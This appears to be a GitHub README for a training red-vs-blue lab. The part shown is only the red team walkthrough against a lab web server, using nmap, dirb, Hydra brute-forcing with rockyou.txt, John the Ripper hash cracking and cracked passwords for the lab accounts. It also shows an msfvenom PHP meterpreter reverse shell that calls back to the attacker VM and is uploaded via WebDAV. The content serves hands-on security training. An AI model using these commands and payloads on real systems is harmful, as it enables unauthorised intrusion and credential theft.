# Red-vs-Blue Project

## Summary:

>The purpose of this project is to assess, analyze and harden a vulnerable web server, while monitoring its logs
>This project was hosted in Azure Cloud, by leveraging the Hyper-V Manager on a Windows machine. The three virtual machines deployed off Hyper-V are: 
>
>1. The "Capstone VM" - Hostname: Server 1, running the Web Server, FileBeat, MetricBeat and PacketBeat. 
>2. The logs generated are then sent out to the second machine, the "ELK VM" - Hostname: ELK, running Elasticsearch, Logstash and Kibana. 
>3. The attacker machine used in this scenario is the "Kali VM" - Hostname: Kali, running packetbeat.
>
>NOTE: All virtual machines are hosted on the same virtual subnet: 192.168.1.0/24.

Network Diagram:
<img width="1301" alt="Network Diagram" src="https://user-images.githubusercontent.com/90374994/155470755-b24bfbd8-3198-4cb1-b42b-b24092328429.png">


## Red Team - Security Assessment

First step is to run a quick network scan:

'''bash
nmap -sV -sS 192.168.1.0/24
'''

The result:

![nmap scan](https://user-images.githubusercontent.com/90374994/155526909-55aeea1e-7326-4be4-bd6c-db7885ae215a.png)

We can see the Capstone VM (IP: 192.168.1.105) is hosting a web service on Port 80:

![Website homepage](https://user-images.githubusercontent.com/90374994/155528219-e5c6bdc1-8175-4647-bd95-6e2ba79c84de.png)

To find any hidden files and directories not directly listed on the website we can use Dirbuster (or 'dirb' command from Terminal) by providing it a wordlist to search

'''bash
dirb http://192.168.1.105/ /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
'''

The results show us there are two hidden directories:
  1. http://192.168.1.105/company_folders/secret_folder/
  2. http://192.168.1.105/webdav/

While trying to access the /secret_folder/ directory we are prompted with a warning disclosing the webpage is no longer accessible to the public and a login prompt requesting a username and password:

![secret_folder login](https://user-images.githubusercontent.com/90374994/155529687-3cee176f-441e-4c1c-a5e1-c7746f868931.png)

>NOTE: One clue that is included in the login prompt is "For ashtons eyes only" meaning one of the usernames is potentially "ashton" or "Ashton"

We can try a bruteforcing attack using Hydra and the username "ashton", as well as specifying port 80 and the 'rockyou.txt' wordlist:

'''bash
hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder
'''

The result of the bruteforce attack eventually returns the password found for user 'ashton' - leopoldo

![hydra result](https://user-images.githubusercontent.com/90374994/155531957-70e44d6d-40be-4353-aa9b-baf009ed0e2a.png)

Now that we are logged in to the /secret_folder/ there is a file '/connect_to_corp_server' containing a personal note

![personal note](https://user-images.githubusercontent.com/90374994/155532390-3e9e0928-1a5d-4088-a99f-5ab40364a42e.png)

The personal note includes information about how to connect to /webdav/ as well as a hint that the username might be "ryan" or "Ryan" together with an MD5 password hash for the account. 

We can try saving the hash into a file named "hash.txt" and use John the Ripper or a website such as https://crackstation.net/ to try and crack the password.
For using John the Ripper:

'''bash
john hash.txt --format=raw-md5 --show
'''

The result is the password in plain text: linux4u and we can try to login:

![webdav login](https://user-images.githubusercontent.com/90374994/155534746-23c7d436-04d9-4dbd-9c24-46ee76fe3ca8.png)

Now that we can login to the WebDav service we can try and upload malicious content.

![webdav1](https://user-images.githubusercontent.com/90374994/155537659-0e4003d1-0910-4e6e-a7fa-81ee20ae913c.png)

We will try and craft a meterpreter reverse shell using MSFVenom. Since the reverse shell will attempt to connect to the attacker machine, we will need to specify the LHOST as the Kali VM's IP address and the LPORT as 4444:

'''bash
msfvenom -p php/meterpreter/reverse_tcp -lhost=192.168.1.90 lport=4444 > shell.php
'''

Now, we can drag and drop the file in the WebDav folder, so we can access it from the web browser:

![webdav2](https://user-images.githubusercontent.com/90374994/155539922-532ce74a-d5c3-498c-8241-f787deb823da.png)


